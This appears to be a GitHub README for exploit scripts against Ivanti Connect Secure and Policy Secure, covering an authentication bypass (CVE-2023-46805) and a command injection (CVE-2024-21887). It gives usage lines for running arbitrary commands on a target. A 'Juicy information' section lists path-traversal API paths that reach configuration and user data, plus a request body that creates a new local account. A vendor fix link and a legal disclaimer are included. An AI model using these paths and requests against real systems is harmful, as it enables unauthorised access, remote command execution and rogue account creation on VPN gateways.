# CVE-2023-46805
An authentication bypass vulnerability in the web component of Ivanti ICS 9.x, 22.x and Ivanti Policy Secure allows a remote attacker to access restricted resources by bypassing control checks.

usage: ./CVE-2023-46805.sh http(s)://fqdn:port
<br>./CVE-2023-46805.sh https://my.vpn.ip:443

![image](https://github.com/duy-31/CVE-2023-46805_CVE-2024-21887/assets/20819326/1a5a7b6d-fa45-47ce-bff6-98ecabfee3d6)

notes:
chmod +x CVE-2023-46805.sh
<br> require app curl + json_pp

result if vulnerable, you should see somes stuffs:

![image](https://github.com/duy-31/CVE-2023-46805_CVE-2024-21887/assets/20819326/89b01426-5fb4-4ef1-8fdd-265c948fa8f2)


# CVE-2024-21887
A command injection vulnerability in web components of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure allows an authenticated administrator to send specially crafted requests and execute arbitrary commands on the appliance.

- run the poc (it will try the 2 entries points)

usage: ./CVE-2024-21887.sh http(s)://fqdn:port payload_cmd
<br>./CVE-2024-21887.sh https://my.vpn.ip:443 "touch /tmp/pwned"

result if vulnerable, you should see somes stuffs and your payload should be working:
![image](https://github.com/duy-31/CVE-2023-46805_CVE-2024-21887/assets/20819326/0452af59-20e3-40b2-a941-243fb9cdbbe9)


notes:
chmod +x CVE-2024-21887.sh
<br> require apps curl, xxd, tr & sed

# Juicy information

/api/v1/totp/user-backup-code/../../configuration/system/configuration
/api/v1/totp/user-backup-code/../../system/active-users


/api/v1/totp/user-backup-code/../../configuration/administrators/admin-realms/realm/Admin%20Users

-create an account
/authentication/auth-servers/authserver/System%20Local/local/users/user 

-H 'Content-Type:application/json' -d '{"change-password-at-signin": "false", "consoleaccess": "false", "enabled": "true", "fullname": "new user", "one-timeuse": "false", "password-cleartext": "new_password", "username": "login_user"}'

------
<br>Workaround/Fix: https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US

Kudos: https://attackerkb.com/topics/AdUh6by52K/cve-2023-46805/rapid7-analysis

------

more about me ;) https://www.linkedin.com/in/duy-huan-bui/

⚠️ Disclaimer:
IMPORTANT: This script is provided for educational, ethical testing, and lawful use ONLY. Do not use it on any system or network without explicit permission. Unauthorized access to computer systems and networks is illegal, and users caught performing unauthorized activities are subject to legal actions. The author is NOT responsible for any damage caused by the misuse of this script.

